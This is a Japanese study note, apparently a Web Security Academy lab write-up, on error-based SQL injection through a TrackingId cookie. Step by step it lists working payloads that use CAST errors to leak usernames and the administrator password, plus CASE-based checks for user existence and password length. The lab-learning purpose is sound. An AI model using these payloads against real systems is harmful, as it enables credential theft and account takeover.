
Date: 2025-09-18
Tags: 
Links: [[WSA]], [[SQL]]

***

`CAST(... AS int)` + 比較でエラーを使ったデータ漏洩（error-based extraction）。  


1.  **CAST を使った汎用テスト**
```sql
Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
```
- 送信すると `"AND condition must be boolean"` 的なエラーが出ることがある（比較が必要）。
- 比較を追加して有効化：
```sql
Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```
- 送信後: エラー消える → ペイロードが文法的に有効。


 2. **実データを引き出す（username）**
- 汎用 `SELECT 1` を `username` を返すように変更：
```sql
Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
```
- 観察: 再びエラー。**クエリがトランケート（文字数制限）されており、先に入れたコメント `--` が省略されている**可能性がある（元の TrackingId の長さによりスペース不足）。


3. **元の TrackingId 値を削除して空きを作る**
```sql
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
```
- 送信後: 新しい DB 由来のエラーが出る（サブクエリが複数行を返した等の可能性）。

4. **サブクエリを 1 行に制限**
```sql
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
- 送信後: エラーメッセージに最初の username が露出（例: `ERROR: invalid input syntax for type integer: "administrator"`）。  
- これで `users` テーブルの最初のユーザー名が `administrator` であることを確認できる。

5. **管理者のパスワードを引き出す**
```sql
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
- 送信後: エラーメッセージにパスワードが露出する（ラボ環境での手順）。  
- 露出したパスワードで管理者ログインしてラボ完了。



## 補助的テクニック（エラー誘発／存在確認の別手法）
- **管理者存在確認（CASE + エラー）**（DB 方言依存／例）
```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END 
FROM users WHERE username='administrator')||'
```
- **パスワード長の確認（逐次判定）**（DB 方言依存／例）
```sql
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END 
FROM users WHERE username='administrator')||'
```
- 上記を `>1` → `>2` ... と増やしていき、エラーの有無で長さを推定（writeup では 20 文字と判定）。



#### 観察ポイント／注意
- **コメント `--` の扱い**：多くの DB は `--` の後にスペースか改行を要求する（`-- `）。DB 方言に留意する。  

***
# References